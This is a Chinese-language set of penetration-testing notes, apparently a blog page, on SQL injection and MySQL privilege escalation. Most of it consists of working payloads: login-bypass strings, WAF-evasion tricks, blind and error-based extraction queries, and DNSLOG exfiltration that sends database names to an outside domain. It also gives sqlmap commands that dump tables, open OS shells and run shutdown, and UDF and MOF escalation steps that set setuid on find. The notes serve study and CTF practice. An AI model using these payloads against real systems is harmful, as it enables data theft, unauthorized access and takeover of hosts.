<p>select * from table where id&#x3D;1 and 1&#x3D;1 &#x2F;&#x2F;不报错</p>
<p>select * from table where id&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;报错，则存在注入漏洞</p>
<h2 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a>字符注入</h2><p><strong>查询语句</strong>：select * from table where id&#x3D;‘1’</p>
<p><strong>构造语句</strong>：</p>
<p>select * from table where id&#x3D;‘1’ and ‘1’&#x3D;‘1’ &#x2F;&#x2F;不报错</p>
<p>select * from table where id&#x3D;‘1’ and ‘1’&#x3D;‘2’ &#x2F;&#x2F;报错，则存在注入漏洞</p>
<h2 id="加法和减法"><a href="#加法和减法" class="headerlink" title="加法和减法"></a>加法和减法</h2><p>select * from table where id &#x3D;1%2b1 &#x2F;&#x2F;+有特殊含义故需使用url编码</p>
<p>select * from table where id &#x3D;3-1</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="构造联合查询"><a href="#构造联合查询" class="headerlink" title="构造联合查询"></a>构造联合查询</h2><p>select * from table where id&#x3D;‘1’ union order by 2 #’ &#x2F;&#x2F;测试命令的查询字段数量</p>
<p>select * from table where id&#x3D;‘1’ union select 1,(group_concat(concat(字段1，字段2，…))) from information_schema.schemata <a href="//group_contact">&#x2F;&#x2F;group_concat</a> 显示所有行，concat合并显示选择字段</p>
<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>select * from table where name&#x3D;<em>nameandpassword</em>&#x3D;password</p>
<p>利用：任意输入 ‘ or 1&#x3D;1 # &#x2F;&#x2F;可同时绕过用户名及密码</p>
<h2 id="双写绕过："><a href="#双写绕过：" class="headerlink" title="双写绕过："></a>双写绕过：</h2><p>uniunionon select … &#x2F;&#x2F;部分程序设置了关键词黑名单，通过双写关键字绕过</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>Union seLect … &#x2F;&#x2F;通过大小写绕过</p>
<h2 id="url双编码绕过"><a href="#url双编码绕过" class="headerlink" title="url双编码绕过"></a>url双编码绕过</h2><p>还可通过url编码绕过，将某些特殊字符使用url编码传输</p>
<p>如果服务端是有了urldecode函数则可以通过该方法绕过</p>
<h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>部分程序过滤了空格，将输入限制为单个，则可以通过内联注释绕过 还可通过<code>%a0 ,%09,%0a,%0b,%0c,%0d</code>绕过</p>
<p>select * from table where id&#x3D;‘1’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;order&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;2</p>
<p>select * from table where id&#x3D;’1’and&#x2F;<em>!sleep(10)</em>&#x2F;—+</p>
<h2 id="空字节"><a href="#空字节" class="headerlink" title="空字节"></a>空字节</h2><p>用于绕过一些入侵检测系统，如ids ips等，这些检测系统一般都是用原生语言编写的，而这些语言检验字符串的结尾是通过检测空字节，在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符。%00-空字节</p>
<h2 id="双请求绕过"><a href="#双请求绕过" class="headerlink" title="双请求绕过"></a>双请求绕过</h2><p>有的后台处理同时使用了get与post两种方式，但只对其中一种方式传参进行了处理，就可以绕过</p>
<h2 id="异常请求方式绕过"><a href="#异常请求方式绕过" class="headerlink" title="异常请求方式绕过"></a>异常请求方式绕过</h2><p>将请求方式更改为任意不存在的，只针对特殊情况可以绕过</p>
<h2 id="超大数据包绕过"><a href="#超大数据包绕过" class="headerlink" title="超大数据包绕过"></a>超大数据包绕过</h2><p>为了性能，有些waf不会对超大的数据包进行检验，他们会先判断数据包的长度，只有符合长度要求的包才被检验，所以我们可以构造超长的垃圾数据包来绕过检查。</p>
<h2 id="复参数绕过"><a href="#复参数绕过" class="headerlink" title="复参数绕过"></a>复参数绕过</h2><p>将一个参数传两侧，<code>id=1&amp;id=1 order by 5</code> 那么过滤的时候可能取第一个id，计算的时候则可能取第二个id，逻辑严格一点就不会有这个问题，先取出来再赋值给一个变量，通过这个变量比较就可以避免这个问题。</p>
<h2 id="添加-绕过"><a href="#添加-绕过" class="headerlink" title="添加%绕过"></a>添加%绕过</h2><p>再iis中的asp.dll中对参数中的%会直接当作url编码的一部分被去掉。</p>
<h2 id="pipeline绕过"><a href="#pipeline绕过" class="headerlink" title="pipeline绕过"></a>pipeline绕过</h2><p>将请求字段connection改为keep-live长连接，并关闭bp repeter模块的内容长度自动更新，将攻击的请求粘贴在正常请求的后面重复发一次就可能成功。如果waf只对第一次的请求过滤，则会绕过</p>
<h2 id="关键词替换"><a href="#关键词替换" class="headerlink" title="关键词替换"></a>关键词替换</h2><p>在关键词中插入会被过滤的字符<code>sel&lt;ect</code></p>
<h2 id="空格被过滤通过括号绕过"><a href="#空格被过滤通过括号绕过" class="headerlink" title="空格被过滤通过括号绕过"></a>空格被过滤通过括号绕过</h2><p>如果空格被过滤，可以讲每个部分通过()括起来，这样就不需要空格的参与。</p>
<p>使用空白字符<code>a0 ,%09,%0a,%0b,%0c,%0d</code></p>
<h2 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h2><p>分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。只能逃过waf，不能绕过软件本身的过滤策略，本质是打断了数据，这样请求体就不完整了，过滤规则就匹配不到，于是成功绕过</p>
<h2 id="逗号被过滤绕过"><a href="#逗号被过滤绕过" class="headerlink" title="逗号被过滤绕过"></a>逗号被过滤绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(database() from 1 to 1);</span><br><span class="line">select mid(database() from 1 to 1);</span><br></pre></td></tr></table></figure>

<h3 id="编码字符串绕过"><a href="#编码字符串绕过" class="headerlink" title="编码字符串绕过"></a>编码字符串绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. char       select(char(67,58,45,56,67,45,35,44,3));2. 16进制编码    0x234532e34f2a34b3. hex4. unhex   select convert(unhex(&#x27;e3f23a44b445&#x27;)using utf8)5. to_base64(),from_base64()6. sleep benchmark</span><br></pre></td></tr></table></figure>

<h3 id="字符过滤绕过"><a href="#字符过滤绕过" class="headerlink" title="字符过滤绕过"></a>字符过滤绕过</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ⇒ &amp;&amp;or =&gt; ||&lt; &gt; = =&gt; between() ,likelimit 0,1  =&gt; limit 0 offset 1 limit 1substr =&gt; substring midsleep =&gt; benchmarkspace =&gt; +</span><br></pre></td></tr></table></figure>

<h2 id="二阶注入"><a href="#二阶注入" class="headerlink" title="二阶注入"></a>二阶注入</h2><p>先通过正常途径将sql代码写入数据库存储起来，在通过第二次查询操作执行该语句</p>
<p>判断数据库类型</p>
<p>根据错误提示判断:ora开头的为oracle数据库</p>
<p><code>id=1 and connection_id()</code></p>
<p><code>id=1 and last_insert_id()</code></p>
<p>第一个返回正常，第二个不返回数据，推断为mysql</p>
<h2 id="拆分代码注入"><a href="#拆分代码注入" class="headerlink" title="拆分代码注入"></a>拆分代码注入</h2><p>将一段完整的payload，拆分为几段，分别进行注入，最后形成一段完整的代码 &#x2F;&#x2F;存储型xss</p>
<h2 id="limit子句中的注入"><a href="#limit子句中的注入" class="headerlink" title="limit子句中的注入"></a>limit子句中的注入</h2><p>使用procedure</p>
<p>如果不存在order by子句可使用联合查询注入</p>
<p>如果存在则需使用procedure</p>
<p>报错</p>
<p>select * from table order by name limit 0,1 procedure analyse(exractvalue(1,concat(0x3a,version())),1)</p>
<p>延时</p>
<p>select id from users order by id limit 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(if(mid(version(),1,1) like 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</p>
<p>该方法存在版本限制，只能用于5.0-5.6之间的版本</p>
<h2 id="常用内置函数"><a href="#常用内置函数" class="headerlink" title="常用内置函数"></a>常用内置函数</h2><p>@@version &#x2F;&#x2F;数据库版本号</p>
<p>@@datadir</p>
<p>@@basedir</p>
<p>@@version_compile_os</p>
<p>user() &#x2F;&#x2F;当前登录用户</p>
<p>database() &#x2F;&#x2F;数据库名</p>
<p>current_user()</p>
<p>system_user()</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled.png</p>
<p>select “” &gt; 绝对路径 &#x2F;&#x2F;插入文件</p>
<p>select “” into outfile 绝对路径 &#x2F;&#x2F;插入文件</p>
<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>id&#x3D;1 and SUBSTRING(user(),<em>num</em>, 1) &#x3D; ′chr’</p>
<p>函数可使用：substr length ascii</p>
<p>如果相等则返回正确的执行结果</p>
<p>如果不相等则返回默认的错误提示页或者原生错误提示。</p>
<h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>id&#x3D;1 union select if(substring(user() ,<em>num</em>, 1)&#x3D;chr,sleep(5),1),null,null</p>
<p>if (length(user())&#x3D;5,sleep(5),1)</p>
<p>if(hex(mid(user(),1,1))&#x3D;1,sleep(5),1)</p>
<p>if(left(user(),3)&#x3D;“hrx”,sleep(5),1)</p>
<p>strcmp(left((select database()),1),0x6d)&#x3D;1</p>
<p>如果相等则暂停5秒</p>
<p>如果不相等则返回1</p>
<h2 id="基于报错的"><a href="#基于报错的" class="headerlink" title="基于报错的"></a>基于报错的</h2><p>根据报错信息猜测语法结构</p>
<p>updatexml(1,payload,1)</p>
<p>extractvalue(1,payload)</p>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果mysql得字符集使GBK等宽字节字符集得话</p>
<p>php如果开启了magic_quotes_gpc功能，那么通过_GET,_POST,_COOKIE方法传入的参数中的’,”,null,&#x2F;转义，此时就不能完成注入，我么你可以这样构造注入参数id&#x3D;%4d’,这样的参数后面的’不会被转义，从而达到注入的目的</p>
<p>高字节%e6 %df</p>
<h2 id="长字符串截断"><a href="#长字符串截断" class="headerlink" title="长字符串截断"></a>长字符串截断</h2><p>mysql在没有开启严格模式的情况下，对于插入长度超过字符长度限制的数据并不会报错而是警告，但数据已经成功插入，我们可以利用这一点，创建一个长度超过限制的用户名后面插入很多得空格，当然这个用户名得和管理员得用户名相同，但后面却多了一长串得空格，因为长度超出限制，多余的部分被截断，但此时我们查询数据可管理员的账户的时候，将同时查询到这两个值，于是，我们可以利用我们新创建的这个用户登录管理员的后台。</p>
<h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><p>#锚点 后面的内容不会发送到后台</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ol>
<li><p><strong>通过group by 的特性</strong></p>
<p> group by 在分组的时候有两次计算过程</p>
<p> 第一次，计算之后与虚拟表中的字段进行比较，如果虚拟表中没有则插入，如果有则+1</p>
<p> 第二次，插入过程，经过第一次查询虚拟表之后，发现虚拟表中没有该记录，准备插入，这时又再一次计算，但是因为rand 函数生成的值是随机的，所以第一次和第二次计算的结果可能不一样，但数据库不知道两次结果不一致，仍然进行插入操作，结果就导致，插入的列重复，因为是主键所以不能重复会报错。</p>
<p> <code>select count(*),concat(database(),&quot;@&quot;,@@version,floor(rand(0)*2))x from information_schema.tables group by x</code></p>
</li>
<li><p>updatexml| extractvalue</p>
<p> 这两个函数都是xml替换函数，其中的xpath语法如果出错就会将查询结果以错误的方式显示出来</p>
</li>
<li><p>基于几何函数</p>
<ol>
<li>geometrycollection:存储任意集合图形的集合</li>
<li>multipoint:存储多个点</li>
<li>polygon:多边形</li>
<li>multipolygon:多个多边形</li>
<li>linstring：线</li>
<li>multilinestring：多条线</li>
<li>point：点</li>
</ol>
<p> payload:</p>
<p> <code>select * from from test where id=1 and mutilinestring((select*from(select * from (select user())a)b)))</code> &#x2F;&#x2F;构造语法都是这样。</p>
<p> 只要上述函数中的参数不是集合形状数据，就会报错。有mysql版本限制。
 </p>
</li>
<li><p>基于列命冲突</p>
<p> name-const：该函数可以手动创建一个列，在mysql中如果列命冲突则会导致报错，可以配和join全连接来操作，全来连接会连接两个表，该方法可以用来爆列名。</p>
<p> <code>and exists(select * from (select * from (select name_const(@@version,0)) a join (select name_const(@@version,0))b)c&gt;;</code></p>
<p> 也可以单独使用join,只需要保证join两边的值一样就会导致报错：</p>
<p> <code>select * from (select * from mysql.user a join musql.user b)c;</code></p>
</li>
<li><p>基于数据溢出</p>
<p> ~：按位取反</p>
<p> exp(3)：自然对数的3次方，很容易就溢出了</p>
<p> <code>select * from test where id=1 and exp(~(select * from (select user())a));</code></p>
<p> ~后的内容被取反后会得到一个很大的数，再做为自然对数的指数，得到的值一定会溢出，从而报错将查询结果显示出来，但貌似该方法有版本限制</p>
</li>
</ol>
<h2 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h2><p>我们在发起网络请求的时候，第一步就是解析域名，当域名被成功解析的时候，该域名解析结果将被域名服务器记录下来，我们利用的正是这一点，讲我们想要的数据放在域名的下一级域中外带到域名服务器，通过查询域名服务器的日志，从而获得我们想要的数据，如我们使用<a href="http://www.dnslog.cn/">www.dnslog.cn</a> 这个网站来测试，</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%201.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%201.png</p>
<p>点击获取子域名获取一个包含三级域名的域名给我们，这里我们使用ping命令做测试</p>
<p><code>ping %USERNAME%.4ap7wz.dnslog.cn</code></p>
<p>当ping通的时候，我们点击该网站的刷新记录就可以看到我测试主机的用户名armandhe了。</p>
<p>该注入方法适用于需要时间盲注、没有回显的注入场景。构造mysql语句如下。</p>
<p><code>&#39; and (select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\abc&#39;)))</code></p>
<p>只能应用于windows平台，鸡肋</p>
<p>unc路径，是在windows平台上访问局域网网络资源的一种路径表示方法，我们在window上使用的文件共享服务路径就是通过这种方式，<code>\\172.16.11.24</code> 这也就解释了为什么只能在window平台的服务器上有效，另外多出来的两个<code>\</code>表示转义。</p>
<p><code>load_file</code> 受mysql配置文件中<code>secure_file_priv</code>选项的限制，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secure_file_priv= //允许所有secure_file_priv=&quot;G:\&quot; //允许加载G盘secure_file_priv=null //拒绝</span><br></pre></td></tr></table></figure>

<h2 id="SQLI已死——SQL预编译"><a href="#SQLI已死——SQL预编译" class="headerlink" title="SQLI已死——SQL预编译"></a>SQLI已死——SQL预编译</h2><p>sql注入存在的原因是计算机对代码部分、与数据部分区分错误导致的。</p>
<p>sql语句在执行之前会进行词法分析、语义分析，当代码中有大量的重复语句的时候，就会浪费大量的资源，所以有了预编译的概念。在sql语句执行前，sql语句被预编译，这样，我们就可以复用同一条sql语句，而不需要每次执行sql语句的时候都进行词法分析与语义分析，同时无论我们输入的内容是什么都会被当作字符串，而不会被当作代码部分被执行。当然预编译也存在局限性，预编译只能编译sql的参数部分，而不能编译sql的结构部分，所以当结构部分语句需要动态生成的时候就不能使用预编译，这样就可能存在sql注入的问题。再有预编译的语句也并不是无邪可以，参数部分还是可能存在注入点的，如like子句中用为%在sql中是一个通配符，所以当我们还是有可能精心构造一条sql语句的。</p>
<h1 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h1><p><a href="https://blog.csdn.net/he_and/article/details/78461896?spm=1001.2014.3001.5501">ctf中php常见的考点_一个安全研究员-CSDN博客_ctfphp</a></p>
<h2 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h2><p>当定义一个变量时，如果没有设置值，则该变量会被默认设置为0</p>
<p>如</p>
<p><a href="http://domain/test.php?name%5B%5D=hjx&password%5B%5D=hjx123456">http://domain/test.php?name[]=hjx&amp;password[]=hjx123456</a></p>
<p>此时$_GET[name]&#x3D;[hjx] $_GET[password]&#x3D;[‘hjx123456’] _POST同样存在该特性</p>
<h2 id="内置函数的松散性"><a href="#内置函数的松散性" class="headerlink" title="内置函数的松散性"></a>内置函数的松散性</h2><h3 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h3><p>如果两个字符串相等则返回0</p>
<ul>
<li>5.2 中是将两个参数先转换成string类型。</li>
<li>5.3.3 以后，当比较数组和字符串的时候，返回是0。</li>
<li>5.5 中如果参数不是string类型，直接return了</li>
</ul>
<p>可结合上述变量默认值的特性进行渗透</p>
<p>md5 与 sha1</p>
<p>md5与sha1函数不能比较数组,如果值为数组，直接返回false</p>
<p>sha1([‘hjx123456’])&#x3D;&#x3D;&#x3D;false</p>
<p>md5([]) &#x3D;&#x3D;&#x3D; false</p>
<p>转换的结果如果存在0e开头的后面全是数字的值，则在进行比较的时候会被当做科学计数法进行比较，我们只需要找到一个同样以0e开头后面接数组的值就可顺利绕过</p>
<p>md5(value,true) &#x2F;&#x2F;这种转换结果会生成一个16位原始二进制值，此时如果转后后的值的前面存在’or’的话就可以构造语句</p>
<p>弱类型</p>
<p>当一个整型和其他类型比较时，会先把其他类型使用intval转换转换为整型在进行比较</p>
<p>intval</p>
<p>intval 在处理非整型数据的时候，会从字符串的开始进行转换，直接遇到一个非数字的字符：如，intval(‘234aba’)&#x3D;&#x3D;&#x3D;234 <a href="//true">&#x2F;&#x2F;true</a> ,遇到无法转转的字符串，intval不会报错，而是直接返回0</p>
<p>is_numeric</p>
<p>PHP提供了is_numeric函数，用来变量判断是否为数字。但是函数的范围比较广泛，不仅仅是十进制的数字,八进制，十六进制均可</p>
<p>in_array</p>
<p>查某一个值是否在数组中，当值不为数字的时候，会进行自动类型转换，转换原则同intval</p>
<p>preg_match</p>
<p>匹配的时候如果没有限制开始与结尾，则可能存在绕过问题</p>
<p>如：匹配ip地址的时候，1.1.1.1 union 这样的语句也是可以通过的</p>
<p>egrep</p>
<p>该命令在碰到%00的时候会被截断</p>
<p>make_set(“3”,str1,str2,str3)</p>
<p>该函数将3转换为二进制数为0011，反过来就是1100，第一位1对应str1,第二位1对应str2,以此类推，当某些函数被过滤之后可以通过该函数来绕过</p>
<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --current-db</span><br></pre></td></tr></table></figure>

<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security --tables</span><br></pre></td></tr></table></figure>

<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --columns</span><br></pre></td></tr></table></figure>

<h3 id="获取表中数据"><a href="#获取表中数据" class="headerlink" title="获取表中数据"></a>获取表中数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 -D security -T users --dump或者dump-all //获取当前数据库中所有的记录</span><br></pre></td></tr></table></figure>

<h3 id="获取sql-shell"><a href="#获取sql-shell" class="headerlink" title="获取sql-shell"></a>获取sql-shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --sql-shell//获取一个sql-shell环境 功能受限，只能查.....</span><br></pre></td></tr></table></figure>

<h3 id="获取os-shell"><a href="#获取os-shell" class="headerlink" title="获取os-shell"></a>获取os-shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --os-shell</span><br></pre></td></tr></table></figure>

<h3 id="执行os命令"><a href="#执行os命令" class="headerlink" title="执行os命令"></a>执行os命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;172.16.11.29:60080/sqli-labs/less-1/?id=1&quot; --dbms mysql -p id --random-agent --risk 3 --level 5 --os-cmd=shutdown</span><br></pre></td></tr></table></figure>

<h2 id="其他常用指令"><a href="#其他常用指令" class="headerlink" title="其他常用指令"></a>其他常用指令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--method post|get--data &quot;uname=123&amp;passwd=123&quot;  //指定post表单上传的数据</span><br><span class="line">-p uname //指定注入的字段</span><br><span class="line">--technique=B //基于布尔的盲注    </span><br><span class="line">T //时间    </span><br><span class="line">E // error    </span><br><span class="line">U //union    </span><br><span class="line">S //多语句查询</span><br><span class="line">-m 1.txt //从文件中获取多个url</span><br><span class="line">-r url.txt //从文件中加载http请求</span><br><span class="line">-g &quot;inurl:\.php?id=1\&quot; googlehacking--form //这样就不需要指定--data了，软件会自动去寻找表单。get/post方法均可</span><br><span class="line">--dbs //枚举所有的数据库</span><br><span class="line">--users //所有用户</span><br><span class="line">--current-user //当前用户</span><br><span class="line">--passwords //枚举数据库管理系统的密码</span><br><span class="line">--privileges //枚举DMBMS的用户权限</span><br><span class="line">--roles //枚举DBMS用户的角色</span><br><span class="line">--file-read--file-write</span><br></pre></td></tr></table></figure>

<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><p><a href="https://blog.csdn.net/qq_43430261/article/details/107258466">udf提权_GitCloud的博客-CSDN博客</a></p>
<p>udf——用户自定义函数</p>
<p>通过自定义mysql函数，对mysql的功能进行扩充，添加的函数可以项mysql的内置函数一样被调用执行，mysql的用户自定义函数存放mysql根目录下的&#x2F;mysql&#x2F;lib&#x2F;plugin里面，这里面存储着mysql的动态链接库文件。我们讲自定义的库文件放进去后，还有再mysql中执行<code>create FUNVTION function_name RETURNS STRING SONAME &#39;udf.dll&#39;</code> 命令将该库文件中的函数导入，才能使用该函数，就像python里面的导入模块、方法一样的</p>
<p>这个<code>udf.dll</code> 不需要我们自己编写，我们也没有哪个本事，可以利用sqlmap为我们提供的。</p>
<p>进行udf提权的前提是我们已经获得了一个网站的webshell了,获得webshell后，就可以再网站的主目录下的config.php文件里面（一般都在这个文件里面定义了数据库的用户名密码）查看数据库的用户名与密码</p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p &#x27;R@v3nSecurity&#x27; # 进入mysqluse mysql;   </span><br><span class="line"># 切换数据库</span><br><span class="line">create table foo (line blob); </span><br><span class="line"># 新建一个表，用来存放本地传来的udf文件的内容</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/1518.so&#x27;)); </span><br><span class="line"># 在foo中写入udf文件内容</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;  </span><br><span class="line"># 将udf文件内容传入新建的udf文件中,这里的dumpfile要和用linEnum.sh查看的mysql的路径一致</span><br><span class="line"># windows中，对于mysql小于5.1的，导出目录为C:\Windows\或C:\Windows\System32\，linux中，5.1以上lib\plugin</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;; </span><br><span class="line"># 导入udf函数select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);create table foo(line blob);</span><br><span class="line"># 给 find 命令加上 setuid 的标志，然后调用find的-exec指令来执行命令quit; </span><br><span class="line"># 退出mysql</span><br></pre></td></tr></table></figure>

<p><strong>提权文件路径：</strong></p>
<p>sqlmap:<code>/usr/share/sqlmap/data/udf/mysql/linux/64/</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%202.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%202.png</p>
<p>metasploit:<code>/usr/share/metasploit-framework/data/exploits/mysql</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%203.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%203.png</p>
<p><strong>linux中mysql插件路劲：</strong></p>
<p><code>/usr/lib/x86_64-linux-gun/mariadb19/plugin</code></p>
<p>或者在数据库中通过<code>select @@plugin_dir</code> 查看</p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%204.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%204.png</p>
<p>插件目录默认是不存在的，需要我们手动创建，当时sql用户往往并不具备创建文件夹的权限，故在windows系统下，可以通过ads备份文档流的方式绕过。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@basedir</span>; <span class="operator">/</span><span class="operator">/</span>查找到mysql的目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>利用NTFS ADS创建lib目录</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;It is dll&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#x27;</span>;<span class="operator">/</span><span class="operator">/</span>利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure>

<p><strong>注意:</strong></p>
<p>sqlmap中的四个动态链接库文件是加过密的，需要在&#x2F;sqlmap&#x2F;extra&#x2F;cloak目录下执行下面命令才能生效。</p>
<p><code>python .\cloak.py -d -i ..\..\data\udf\mysql\linux\64\lib_mysqludf_sys.so_ -o linux_udf_64.so</code></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%205.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%205.png</p>
<p><strong>复制so文件到mysql插件目录</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%206.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%206.png</p>
<p><strong>在ida中查看so文件中的函数</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%207.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%207.png</p>
<p><strong>在mysql中导入动态链接库中的函数</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%208.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%208.png</p>
<p><strong>测试该函数</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%209.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%209.png</p>
<p><strong>测试结果</strong></p>
<p><img src="https://www.notion.so/sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760/Untitled%2010.png"></p>
<p>sql%E6%B3%A8%E5%85%A5%20629f306f168c40bcadaf968bb14be760&#x2F;Untitled%2010.png</p>
<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>仅限windows 和windows server2003以下</p>
<p><code>c:\windows\system32\wbem\mof\nullevt.mof</code> 每隔一分钟就会以System身份执行一次，于是我们想办法将这个文件替换掉成我们想要的代码就ok了。那么要首先提权，我们就必须要满足以下的条件</p>
<p>首先我么们已经获取了以root权限运行的sqlshell，root用户读该目录具有写的权限，apache的secure-file-priv处于没有对访问目录做限制。</p>
<p>我们可以用以下命令查看</p>
<p><code>show global variables like &#39;%secure_file_priv%&#39;</code></p>
<p>如果上述条件满足则可以尝试执行</p>
<p>select load_file(‘mof提权文件路径’) into dumpfile ‘<code>c:\windows\system32\wbem\mof\nullevt.mof</code>’</p>
